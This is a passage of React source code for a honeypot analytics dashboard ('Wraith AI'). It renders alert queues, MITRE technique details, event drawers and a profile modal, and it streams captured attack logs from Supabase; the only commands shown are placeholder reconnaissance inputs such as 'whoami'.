                    triggerToast(`Canary token ${selectedCanary.id} disabled`);
                  }}
                >
                  <IconTrash size={15} /> Disable Token
                </button>
              </div>
            </footer>
          </aside>
        </div>
      )}

      {toast && (
        <div className="toast-notification">
          <IconShieldLock size={16} />
          <span>{toast}</span>
        </div>
      )}
    </>
  );
}

function PlaybooksView({ onEvent, eventsList }) {
  const [query, setQuery] = useState("");
  const filteredEvents = eventsList.filter((event) => `${event.title} ${event.id} ${event.technique}`.toLowerCase().includes(query.toLowerCase())).slice(0, 40);
  return (
    <>
      <div className="page-actions"><div className="tab-switch"><button className="active">Threat Alerts <span>27</span></button></div><label className="search-field compact"><IconSearch size={15} /><input value={query} onChange={(event) => setQuery(event.target.value)} placeholder="Search alerts…" /></label></div>
      <div className="alert-layout"><div className="alert-queue">{filteredEvents.map((event) => <button onClick={() => onEvent(event)} key={event.id}><span className={`alert-icon ${event.severity.toLowerCase()}`}><IconAlertTriangle size={18} /></span><span><Severity value={event.severity} /><strong>{event.title}</strong><small>{event.id} · {event.destination} · {event.technique}</small></span><div><Status value={event.status} /><time>{formatTimestamp(event.timestamp)}</time></div></button>)}</div><Panel title="Detection Index" eyebrow="Behavioral alert density"><div className="queue-score"><Chart height={210} option={{ series: [{ type: "gauge", startAngle: 210, endAngle: -30, min: 0, max: 100, splitNumber: 5, radius: "95%", axisLine: { lineStyle: { width: 12, color: [[.52, COLORS.green], [.76, COLORS.orange], [1, COLORS.red]] } }, pointer: { itemStyle: { color: "#d9e5f7" }, width: 4, length: "58%" }, axisTick: { show: false }, splitLine: { show: false }, axisLabel: { show: false }, detail: { valueAnimation: true, formatter: "67", color: "#f3f7ff", fontSize: 26, offsetCenter: [0, "25%"] }, title: { show: true, color: "#7484a3", fontSize: 10, offsetCenter: [0, "50%"] }, data: [{ value: 67, name: "DETECTION INDEX" }] }] }} /><div className="queue-metrics"><span><b>11</b>Critical</span><span><b>16</b>High</span><span><b>9m</b>Oldest</span></div></div></Panel></div>
    </>
  );
}

function MitreDrawer({ technique, onClose }) {
  if (!technique) return null;
  const severityValue = technique.severity || "medium";
  return (
    <div className="drawer-backdrop" onMouseDown={(e) => e.target === e.currentTarget && onClose()}>
      <aside className="event-drawer" role="dialog" aria-modal="true" aria-label="MITRE Technique Details">
        <header>
          <div>
            <span className="eyebrow">{technique.id}</span>
            <h2>{technique.name}</h2>
          </div>
          <button className="icon-button" onClick={onClose} aria-label="Close details">
            <IconX size={18} />
          </button>
        </header>
        <div className="drawer-summary">
          <Severity value={severityValue} />
          <span className="score-chip">Heat Level {severityValue.toUpperCase()}</span>
        </div>
        <section>
          <h3>Description</h3>
          <p>{technique.description}</p>
        </section>
        <section>
          <h3>Honeypot Telemetry Evidence</h3>
          <dl className="detail-list">
            <div>
              <dt>Observed Probe</dt>
              <dd><code>{technique.evidence}</code></dd>
            </div>
            <div>
              <dt>TOTAL LOGGED EVENTS</dt>
              <dd>{technique.attempts} events</dd>
            </div>
          </dl>
        </section>
        <section>
          <h3>Triggered Sensors</h3>
          <div className="drawer-timeline">
            {technique.sensors.map((sensor, i) => (
              <span key={sensor}><i />{sensor}<small>Priority {i + 1}</small></span>
            ))}
          </div>
        </section>
        <footer>
          <button className="primary-button" onClick={onClose}>Close Details</button>
        </footer>
      </aside>
    </div>
  );
}

function EventDrawer({ event, onClose, onViewThreatIntel, onDeleteEvent }) {
  if (!event) return null;
  return (
    <div className="drawer-backdrop" onMouseDown={(e) => e.target === e.currentTarget && onClose()}>
      <aside className="event-drawer" role="dialog" aria-modal="true" aria-label="Event details">
        <header>
          <div><span className="eyebrow">{event.id}</span><h2>{event.title}</h2></div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            {onDeleteEvent && (
              <button
                className="icon-button"
                style={{ color: '#ff5c70' }}
                onClick={() => onDeleteEvent(event)}
                title="Delete event permanently"
                aria-label="Delete event permanently"
              >
                <IconTrash size={18} />
              </button>
            )}
            <button className="icon-button" onClick={onClose} aria-label="Close event details"><IconX size={18} /></button>
          </div>
        </header>
        <div className="drawer-summary"><Severity value={event.severity} /><Status value={event.status} /><span className="score-chip">Risk {event.score}</span></div>
        <section><h3>Analyst summary</h3><p>{event.summary || event.summary_en || "Honeypot telemetry event recorded."}</p></section>
        <section><h3>Event evidence</h3><dl className="detail-list"><div><dt>Source IP</dt><dd><code>{event.sourceIp}</code> {event.country ? `· ${event.city}, ${event.country}` : ""}</dd></div>{event.credentials && <div><dt>Credentials Used</dt><dd><code>{event.credentials}</code></dd></div>}{event.command && <div><dt>Executed Command</dt><dd><code style={{ fontSize: '11px' }}>{event.command}</code></dd></div>}<div><dt>Destination</dt><dd>{event.destination} · {event.protocol}</dd></div><div><dt>MITRE mapping</dt><dd><code>{event.technique}</code> · {event.tactic}</dd></div><div><dt>Attempts</dt><dd>{event.attempts}</dd></div><div><dt>Observed</dt><dd>{formatTimestamp(event.timestamp)}</dd></div><div><dt>Analysis Engine</dt><dd>{event.analyst}</dd></div></dl></section>
        <section><h3>Threat Intelligence</h3><dl className="detail-list"><div><dt>IP Reputation</dt><dd><span className="severity severity-high" style={{ display: 'inline-flex', alignItems: 'center' }}><span style={{ marginRight: '6px' }} />High Risk ({event.score}/100)</span></dd></div><div><dt>Known TTPs</dt><dd><code>{event.technique}</code> · {event.tactic}</dd></div>{event.summary_en && <div><dt>Executive Summary (EN)</dt><dd><small>{event.summary_en}</small></dd></div>}</dl></section>
        <div className="drawer-safe"><IconShieldCheck size={19} /><span><strong>Private simulation</strong><small>No production system or real person is represented.</small></span></div>
        <footer>
          <button className="ghost-button" onClick={onClose}>Close</button>
          {onDeleteEvent && (
            <button
              className="ghost-button"
              style={{ color: '#ff5c70', borderColor: 'rgba(255, 92, 112, 0.35)', marginRight: 'auto', display: 'inline-flex', alignItems: 'center', gap: '6px' }}
              onClick={() => onDeleteEvent(event)}
            >
              <IconTrash size={15} />Delete Log
            </button>
          )}
          <button className="primary-button" onClick={() => onViewThreatIntel(event)}><IconActivity size={16} />Analyze Session</button>
        </footer>
      </aside>
    </div>
  );
}

export function App() {
  const [eventsList, setEventsList] = useState(() =>
    events.map((ev) => ({
      ...ev,
      status: ev.status === "Contained" ? "Captured" : ev.status === "Closed" ? "Logged" : ev.status
    }))
  );
  const [sessionsList, setSessionsList] = useState(sessions);
  const [selectedSessionId, setSelectedSessionId] = useState(null);
  const [toast, setToast] = useState(null);
  const triggerToast = (msg) => {
    setToast(msg);
    setTimeout(() => setToast(null), 3000);
  };

  useEffect(() => {
    let channel;

    async function loadSupabaseLogs() {
      try {
        const { data, error } = await supabase
          .from("attack_logs")
          .select("*")
          .order("timestamp", { ascending: false })
          .limit(100);

        if (error) {
          console.error("Supabase fetch error:", error);
          return;
        }

        if (data && data.length > 0) {
          const { events: aggEvents, sessions: aggSessions } = aggregateAttackLogs(data);

          setEventsList((prev) => {
            const existingIds = new Set(prev.map((e) => e.id));
            const newUnique = aggEvents.filter((e) => !existingIds.has(e.id));
            return [...newUnique, ...prev];
          });

          setSessionsList((prev) => {
            const existingIds = new Set(prev.map((s) => s.id));
            const newUnique = aggSessions.filter((s) => !existingIds.has(s.id));
            return [...newUnique, ...prev];
          });
        }
      } catch (err) {
        console.error("Failed to load attack logs from Supabase:", err);
      }
    }

    loadSupabaseLogs();

    channel = supabase
      .channel("realtime_honeypot")
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "attack_logs",
        },
        (payload) => {
          if (payload?.new) {
            const newLog = payload.new;
            const ip = newLog.src_ip || "127.0.0.1";
            const cleanIp = ip.replaceAll(".", "-");

            setSessionsList((prevSessions) => {
              const openSessionIndex = prevSessions.findIndex(
                (s) => s.sourceIp === ip && s.id.startsWith("SES-AGG-") && s.commands.length < 8
              );

              if (openSessionIndex !== -1) {
                const targetSession = prevSessions[openSessionIndex];
                const newCmdIdx = targetSession.commands.length;
                const newCmds = [
                  ...targetSession.commands,
                  {
                    at: newCmdIdx * 6 + 3,
                    input: newLog.command || newLog.summary_en || "whoami",
                    output: "[realtime honeypot response captured & analyzed by Gemini 2.5]"
                  }
                ];
                const updatedSession = {
                  ...targetSession,
                  commandCount: newCmds.length,
                  commands: newCmds,
                  intent: `Aggregated multi-command session (${newCmds.length} commands captured from ${ip}). Chronological sequence: ${newCmds.map((c) => c.input).join(" ➔ ")}`
                };
                const updatedList = [...prevSessions];
                updatedList[openSessionIndex] = updatedSession;
                return updatedList;
              } else {
                const batchNum = prevSessions.filter((s) => s.sourceIp === ip).length + 1;
                const newSession = {
                  id: `SES-AGG-${cleanIp}-${batchNum}`,
                  started: newLog.timestamp ? new Date(newLog.timestamp).toISOString() : new Date().toISOString(),
                  duration: 120,
                  sourceIp: ip,
                  country: "Realtime Honeypot",
                  protocol: "SSH",
                  sensor: "cowrie-decoy",
                  severity: newLog.threat_level ? (newLog.threat_level.charAt(0).toUpperCase() + newLog.threat_level.slice(1).toLowerCase()) : "High",
                  status: "Captured",
                  commandCount: 1,
                  intent: newLog.summary_en || newLog.attack_category || `Session batch #${batchNum} for ${ip}`,
                  commands: [
                    {
                      at: 5,
                      input: newLog.command || "whoami",
                      output: "[realtime honeypot response captured & analyzed by Gemini 2.5]"
                    }
                  ]
                };
                return [newSession, ...prevSessions];
              }
            });

            setEventsList((prevEvents) => {
              const openEventIndex = prevEvents.findIndex(
                (e) => e.sourceIp === ip && e.id && e.id.startsWith("EVT-AGG-") && e.attempts < 8
              );

              if (openEventIndex !== -1) {
                const targetEvent = prevEvents[openEventIndex];
                const newAttempts = targetEvent.attempts + 1;
                const updatedCmd = `${targetEvent.command} ; ${newLog.command || ''}`;
                const updatedEvent = {
                  ...targetEvent,
                  attempts: newAttempts,
                  title: `Correlated Session (${newAttempts} CLI inputs) - ${newLog.attack_category || targetEvent.tactic}`,
                  command: updatedCmd,
                  summary: `Aggregated threat session (${newAttempts} commands captured from ${ip}).`
                };
                const updatedList = [...prevEvents];
                updatedList[openEventIndex] = updatedEvent;
                return updatedList;
              } else {
                const norm = normalizeSupabaseLog(newLog);
                return [norm, ...prevEvents];
              }
            });

            triggerToast(`New live attack command captured from ${ip}`);
          }
        }
      )
      .subscribe();

    return () => {
      if (channel) supabase.removeChannel(channel);
    };
  }, []);

  const handleDeleteEvent = async (eventOrId, optionalId) => {
    const idToDelete = typeof eventOrId === 'object' ? eventOrId.id : (optionalId || eventOrId);
    const eventIdToDelete = typeof eventOrId === 'object' ? (eventOrId.event_id || eventOrId.id) : eventOrId;

    if (!window.confirm("Are you sure you want to delete this attack log permanently?")) {
      return;
    }

    try {
      const { error } = await supabase
        .from('attack_logs')
        .delete()
        .or(`id.eq.${idToDelete},event_id.eq.${eventIdToDelete}`);

      if (error) {
        console.error('Error deleting event from Supabase:', error);
      }
    } catch (err) {
      console.error('Failed to delete event from Supabase:', err);
    }

    setEventsList((prev) => prev.filter((evt) => evt.id !== idToDelete && evt.event_id !== eventIdToDelete && evt.id !== eventIdToDelete));
    setSessionsList((prev) => prev.filter((s) => s.id !== idToDelete && s.id !== `SES-${idToDelete}` && s.id !== `SES-LIVE-${idToDelete}` && s.id !== `SES-AGG-${idToDelete}`));

    if (selectedEvent?.id === idToDelete || selectedEvent?.id === eventIdToDelete) {
      setSelectedEvent(null);
    }

    triggerToast("Attack log permanently deleted");
  };

  const handleViewThreatIntel = (eventToAnalyze) => {
    if (eventToAnalyze) {
      const targetSessionId = eventToAnalyze.sessionId || `SES-AGG-${(eventToAnalyze.sourceIp || "127.0.0.1").replaceAll(".", "-")}-1`;
      let sessionMatch = sessionsList.find(
        (s) => s.id === targetSessionId || s.id === eventToAnalyze.id || s.sourceIp === eventToAnalyze.sourceIp
      );

      if (!sessionMatch) {
        sessionMatch = {
          id: targetSessionId,
          started: eventToAnalyze.timestamp || new Date().toISOString(),
          duration: 120,
          sourceIp: eventToAnalyze.sourceIp || "127.0.0.1",
          country: eventToAnalyze.country || "Realtime Honeypot",
          protocol: eventToAnalyze.protocol || "SSH",
          sensor: eventToAnalyze.destination || "cowrie-ssh-02",
          severity: eventToAnalyze.severity || "High",
          status: "Captured",
          commandCount: 1,
          intent: eventToAnalyze.summary || eventToAnalyze.summary_en || eventToAnalyze.tactic,
          commands: [
            {
              at: 5,
              input: eventToAnalyze.command || eventToAnalyze.title || "uname -a",
              output: "[realtime honeypot response captured & analyzed by Gemini 2.5]"
            }
          ]
        };
        setSessionsList((prev) => [sessionMatch, ...prev]);
      }

      setSelectedSessionId(sessionMatch.id);
    }
    setSelectedEvent(null);
    setActiveView("sessions");
  };
  const [activeView, setActiveView] = useState("overview");
  const [period, setPeriod] = useState("Daily");
  const [live, setLive] = useState(true);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [selectedMitreTechnique, setSelectedMitreTechnique] = useState(null);
  const [query, setQuery] = useState("");
  const [severity, setSeverity] = useState("All severities");
  const [status, setStatus] = useState("All statuses");
  const [globalSearchOpen, setGlobalSearchOpen] = useState(false);
  const [notificationOpen, setNotificationOpen] = useState(false);
  const [profileMenuOpen, setProfileMenuOpen] = useState(false);
  const [accountModalOpen, setAccountModalOpen] = useState(false);
  const [modalView, setModalView] = useState("profile");
  const [isLoggedOut, setIsLoggedOut] = useState(false);
  const [muteAudio, setMuteAudio] = useState(false);
  const [tick, setTick] = useState(0);
  const telemetry = useLocalTelemetry(live);
  useEffect(() => {
    const narrowViewport = window.matchMedia("(max-width: 720px)");
    const closeForNarrowViewport = (event) => {
      if (event.matches) setSidebarOpen(false);
    };
    closeForNarrowViewport(narrowViewport);
    narrowViewport.addEventListener("change", closeForNarrowViewport);
    return () => narrowViewport.removeEventListener("change", closeForNarrowViewport);
  }, []);
  useEffect(() => {
    if (!live) return undefined;
    const timer = window.setInterval(() => setTick((value) => value + 1), 6000);
    return () => window.clearInterval(timer);
  }, [live]);
  const CurrentIcon = navItems.find(([key]) => key === activeView)?.[2] ?? IconLayoutDashboard;

  return (
    <div className={`soc-app ${sidebarOpen ? "sidebar-open" : "sidebar-closed"}`}>
      <aside className="sidebar">
        <div className="brand"><span><IconShieldLock size={24} /></span><div><strong>Wraith AI</strong><small>Autonomous Defense</small></div><button className="mobile-sidebar-close" onClick={() => setSidebarOpen(false)} aria-label="Close navigation"><IconX size={18} /></button></div>
        <nav>{navItems.map(([key, label, Icon]) => <button key={key} className={activeView === key ? "active" : ""} onClick={() => { setActiveView(key); setSelectedEvent(null); if (window.matchMedia("(max-width: 720px)").matches) setSidebarOpen(false); }} title={label}><Icon size={19} /><span>{label}</span>{key === "events" && <b>27</b>}</button>)}</nav>
        <div className="sidebar-foot">
          <span className="sensor-health"><i />24/24 Sensors Online</span>
          <div
            onClick={() => {
              setModalView("profile");
              setAccountModalOpen(true);
            }}
            style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px', background: '#111a2b', border: '1px solid var(--border)', borderRadius: '8px', padding: '8px', whiteSpace: 'nowrap' }}
            title="Click to open profile details & session controls"
          >
            <IconUserCircle size={27} style={{ color: 'var(--cyan)', flexShrink: 0 }} />
            <span>
              <strong>Abdullah Al-Sharqawi</strong>
              <small>Security Manager</small>
            </span>
            <IconChevronRight size={15} style={{ color: 'var(--muted)', flexShrink: 0 }} />
          </div>
        </div>
      </aside>

      <header className="topbar">
        <button className="menu-button" onClick={() => setSidebarOpen(!sidebarOpen)} aria-label={sidebarOpen ? "Collapse navigation" : "Expand navigation"}><IconMenu2 size={19} /></button>
        <div className="breadcrumbs"><CurrentIcon size={16} /><span>Security Operations</span><IconChevronRight size={13} /><strong>{viewCopy[activeView][0]}</strong></div>
        <div className="topbar-actions">
          <button className={`live-toggle ${live ? "active" : ""}`} onClick={() => setLive(!live)} aria-pressed={live}><i key={tick} />{live ? "Live" : "Paused"}</button>
          <div className="popover-anchor"><button className="icon-button notification-button" onClick={() => setNotificationOpen(!notificationOpen)} aria-label="Notifications"><IconBell size={18} /><i>3</i></button>{notificationOpen && <div className="popover notifications"><header><strong>Notifications</strong><button onClick={() => setNotificationOpen(false)} aria-label="Close notifications"><IconX size={14} /></button></header>{eventsList.slice(0, 3).map((event) => <button key={event.id} onClick={() => { setSelectedEvent(event); setNotificationOpen(false); }}><span className={`event-dot ${event.severity.toLowerCase()}`} /><span><strong>{event.title}</strong><small>{event.id} · {event.severity}</small></span></button>)}</div>}</div>

        </div>
      </header>

      <main className="workspace">
        <div className="page-heading">
          <div>
            <span className="eyebrow">Wraith AI — Autonomous Threat Intelligence Platform</span>
            <h1>{viewCopy[activeView][0]}</h1>
            <p>Enterprise Honeypot Analytics Platform</p>
          </div>
        </div>
        {activeView === "overview" && <Overview {...{ period, setPeriod, onEvent: setSelectedEvent, onDeleteEvent: handleDeleteEvent, eventsList }} />}
        {activeView === "events" && <EventsView {...{ query, setQuery, severity, setSeverity, status, setStatus, onEvent: setSelectedEvent, onDeleteEvent: handleDeleteEvent, live, telemetry, eventsList }} />}
        {activeView === "map" && <AttackMap {...{ period, setPeriod }} />}
        {activeView === "mitre" && <MitreView period={period} setPeriod={setPeriod} onSelectMitre={setSelectedMitreTechnique} />}
        {activeView === "sessions" && (
          <SessionsView
            sessionsList={sessionsList}
            selectedSessionId={selectedSessionId}
            onSelectSession={setSelectedSessionId}
          />
        )}
        {activeView === "iocs" && <IocsView />}
        {activeView === "files" && <FilesView />}
        {activeView === "canary" && <CanaryView />}
        {activeView === "playbooks" && <PlaybooksView onEvent={setSelectedEvent} eventsList={eventsList} />}
        <footer className="workspace-footer"><span>{syntheticMeta.notice}</span><strong><IconShieldCheck size={14} />Local defensive simulation</strong></footer>
      </main>
      <EventDrawer event={selectedEvent} onClose={() => setSelectedEvent(null)} onViewThreatIntel={handleViewThreatIntel} onDeleteEvent={handleDeleteEvent} />
      <MitreDrawer technique={selectedMitreTechnique} onClose={() => setSelectedMitreTechnique(null)} />
      {toast && (
        <div className="toast-notification">
          <IconShieldCheck size={16} style={{ color: COLORS.green }} />
          <span>{toast}</span>
        </div>
      )}
      {accountModalOpen && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 110, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(5, 8, 15, 0.85)', backdropFilter: 'blur(8px)' }}>
          <div style={{ background: '#0c1524', border: '1px solid var(--border-bright)', borderRadius: '12px', width: '450px', maxWidth: '90%', display: 'flex', flexDirection: 'column', overflow: 'hidden', boxShadow: '0 20px 50px rgba(0,0,0,0.5)' }}>

            {/* Modal Header */}
            <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '16px 20px', borderBottom: '1px solid var(--border)' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <IconUserCircle size={20} style={{ color: 'var(--cyan)' }} />
                <strong style={{ fontSize: '13px', color: '#edf4ff' }}>
                  {modalView === "profile" ? "User Profile" : "Change User Password"}
                </strong>
              </div>
              <button onClick={() => setAccountModalOpen(false)} style={{ background: 'transparent', border: 'none', color: '#93a3bb', cursor: 'pointer' }}>
                <IconX size={16} />
              </button>
            </header>

            {/* Modal Content */}
            <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '20px' }}>

              {modalView === "profile" ? (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  {/* User Profile Header Card */}
                  <div style={{ display: 'flex', alignItems: 'center', gap: '12px', padding: '12px', background: '#111a2b', borderRadius: '8px', border: '1px solid var(--border)' }}>
                    <IconUserCircle size={40} style={{ color: '#26d8cf' }} />
                    <div style={{ display: 'flex', flexDirection: 'column' }}>
                      <strong style={{ fontSize: '14px', color: '#edf4ff' }}>Abdullah Al-Sharqawi</strong>
                      <span style={{ fontSize: '10px', color: '#7e8da8' }}>Security Manager</span>
                    </div>
                  </div>

                  {/* Profile Details List */}
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '11px', background: '#0e1726', padding: '14px', borderRadius: '8px', border: '1px solid rgba(51, 65, 85, 0.4)' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #1e293b', paddingBottom: '6px' }}>
                      <span style={{ color: '#7e8da8' }}>Full Name</span>
                      <span style={{ color: '#edf4ff', fontWeight: '600' }}>Abdullah Al-Sharqawi</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #1e293b', paddingBottom: '6px' }}>
                      <span style={{ color: '#7e8da8' }}>Job Title</span>
                      <span style={{ color: '#edf4ff', fontWeight: '500' }}>Security Manager & SOC Lead</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #1e293b', paddingBottom: '6px' }}>
                      <span style={{ color: '#7e8da8' }}>Work Email</span>
                      <span style={{ color: '#26d8cf', fontFamily: 'monospace', fontWeight: '500' }}>a.alsharqawi@honeypot.internal</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #1e293b', paddingBottom: '6px' }}>
                      <span style={{ color: '#7e8da8' }}>Mobile Phone</span>
                      <span style={{ color: '#edf4ff', fontFamily: 'monospace' }}>+966 54 892 1045</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #1e293b', paddingBottom: '6px' }}>
                      <span style={{ color: '#7e8da8' }}>Employee ID</span>
                      <span style={{ color: '#edf4ff', fontFamily: 'monospace' }}>EMP-94021</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #1e293b', paddingBottom: '6px' }}>
                      <span style={{ color: '#7e8da8' }}>Security Clearance</span>
                      <span style={{ color: '#f59e0b', fontWeight: '600' }}>Level 4 — Top Secret</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #1e293b', paddingBottom: '6px' }}>
                      <span style={{ color: '#7e8da8' }}>Location / Hub</span>
                      <span style={{ color: '#edf4ff' }}>Riyadh Operations Center</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', paddingBottom: '2px' }}>
                      <span style={{ color: '#7e8da8' }}>Authorization Level</span>
                      <span style={{ color: '#34d399', background: 'rgba(52, 211, 153, 0.1)', padding: '2px 6px', borderRadius: '4px', fontSize: '10px', fontWeight: '600' }}>Administrator</span>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div style={{ display: 'flex', gap: '10px', marginTop: '4px' }}>
                    <button
                      onClick={() => setModalView("changePassword")}
                      style={{
                        flex: 1,
                        background: 'rgba(38, 216, 207, 0.12)',
                        border: '1px solid rgba(38, 216, 207, 0.4)',
                        color: 'var(--cyan)',
                        borderRadius: '6px',
                        padding: '10px 14px',
                        fontSize: '11px',
                        fontWeight: '600',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        justify: 'center',
                        gap: '6px',
                        transition: 'all 0.15s'
                      }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.background = 'rgba(38, 216, 207, 0.2)';
                        e.currentTarget.style.borderColor = 'rgba(38, 216, 207, 0.6)';
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.background = 'rgba(38, 216, 207, 0.12)';
                        e.currentTarget.style.borderColor = 'rgba(38, 216, 207, 0.4)';
                      }}
                    >
                      <IconShieldLock size={15} /> Change Password
                    </button>
                    <button
                      onClick={() => {
                        setAccountModalOpen(false);
                        setIsLoggedOut(true);
                        triggerToast("Logged out successfully");
                      }}
                      style={{
                        flex: 1,
                        background: 'rgba(239, 68, 68, 0.12)',
                        border: '1px solid rgba(239, 68, 68, 0.4)',
                        color: '#f87171',
                        borderRadius: '6px',
                        padding: '10px 14px',
                        fontSize: '11px',
                        fontWeight: '600',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        justify: 'center',
                        gap: '6px',
                        transition: 'all 0.15s'
                      }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.background = 'rgba(239, 68, 68, 0.25)';
                        e.currentTarget.style.color = '#ef4444';
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.background = 'rgba(239, 68, 68, 0.12)';
                        e.currentTarget.style.color = '#f87171';
                      }}
                    >
                      <IconLogout size={15} /> Log Out
                    </button>
                  </div>
                </div>
              ) : (
                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    triggerToast("Password updated securely");
                    setModalView("profile");
                  }}
                  style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}
                >
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <label style={{ fontSize: '10px', color: '#7e8da8' }}>Current Password</label>
                    <input
                      type="password"
                      required
                      placeholder="••••••••••••"
                      style={{ background: '#0b1422', border: '1px solid var(--border)', borderRadius: '6px', padding: '6px 10px', fontSize: '11px', color: '#dce6f5', outline: 'none' }}
                    />
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <label style={{ fontSize: '10px', color: '#7e8da8' }}>New Password</label>
                    <input
                      type="password"
                      required
                      placeholder="••••••••••••"
                      style={{ background: '#0b1422', border: '1px solid var(--border)', borderRadius: '6px', padding: '6px 10px', fontSize: '11px', color: '#dce6f5', outline: 'none' }}
                    />
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <label style={{ fontSize: '10px', color: '#7e8da8' }}>Confirm New Password</label>
                    <input
                      type="password"
                      required
                      placeholder="••••••••••••"
                      style={{ background: '#0b1422', border: '1px solid var(--border)', borderRadius: '6px', padding: '6px 10px', fontSize: '11px', color: '#dce6f5', outline: 'none' }}
                    />
                  </div>
                  <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end', marginTop: '10px' }}>
                    <button
                      type="button"
                      onClick={() => setModalView("profile")}
                      style={{ background: '#1e293b', border: '1px solid var(--border)', color: '#edf4ff', borderRadius: '6px', padding: '6px 12px', fontSize: '11px', cursor: 'pointer' }}
                    >
                      Back
                    </button>
                    <button
                      type="submit"
                      style={{ background: 'var(--cyan)', color: '#09101c', border: 'none', borderRadius: '6px', padding: '6px 14px', fontSize: '11px', fontWeight: '700', cursor: 'pointer' }}
                    >
                      Update Password
                    </button>
                  </div>
                </form>
              )}

            </div>

            {/* Modal Footer */}
            <footer style={{ display: 'flex', justifyContent: 'flex-end', padding: '12px 20px', borderTop: '1px solid var(--border)', background: '#101929' }}>
              <button onClick={() => setAccountModalOpen(false)} style={{ background: '#1e293b', border: '1px solid var(--border)', color: '#edf4ff', borderRadius: '6px', padding: '6px 14px', fontSize: '11px', cursor: 'pointer' }}>
                Close
              </button>
            </footer>

          </div>
        </div>
      )}

      {isLoggedOut && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(3, 7, 18, 0.96)', backdropFilter: 'blur(16px)' }}>
          <div style={{ background: '#0b1321', border: '1px solid var(--border-bright)', borderRadius: '16px', width: '420px', maxWidth: '90%', padding: '32px 24px', display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', gap: '20px', boxShadow: '0 25px 60px rgba(0,0,0,0.7)' }}>
            <div style={{ width: '56px', height: '56px', borderRadius: '14px', background: 'rgba(38, 216, 207, 0.1)', border: '1px solid rgba(38, 216, 207, 0.3)', display: 'grid', placeItems: 'center', color: 'var(--cyan)' }}>
              <IconShieldLock size={32} />
            </div>
            <div>
              <h2 style={{ fontSize: '18px', color: '#edf4ff', marginBottom: '6px', fontWeight: '700' }}>Enterprise SOC Portal</h2>
              <p style={{ fontSize: '12px', color: '#7e8da8' }}>Session terminated. Authenticate to resume threat operations.</p>
            </div>

            <div style={{ width: '100%', padding: '16px', background: '#111b2e', borderRadius: '12px', border: '1px solid var(--border)', display: 'flex', alignItems: 'center', gap: '14px', textAlign: 'left' }}>
              <IconUserCircle size={44} style={{ color: 'var(--cyan)', flexShrink: 0 }} />
              <div style={{ display: 'flex', flexDirection: 'column', gap: '2px', overflow: 'hidden' }}>
                <strong style={{ fontSize: '13px', color: '#edf4ff' }}>Abdullah Al-Sharqawi</strong>
                <span style={{ fontSize: '10px', color: '#7e8da8' }}>Security Manager & SOC Lead</span>
                <span style={{ fontSize: '10px', color: '#93a3bb', fontFamily: 'monospace' }}>a.alsharqawi@honeypot.internal</span>
                <span style={{ fontSize: '10px', color: '#93a3bb', fontFamily: 'monospace' }}>+966 54 892 1045</span>
              </div>
            </div>

            <button
              className="primary-button"
              style={{ width: '100%', padding: '12px', fontSize: '13px', fontWeight: '600', justifyContent: 'center' }}
              onClick={() => {
                setIsLoggedOut(false);
                triggerToast("Welcome back, Abdullah Al-Sharqawi");
              }}
            >
              <IconShieldCheck size={18} /> Sign In & Resume Session
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
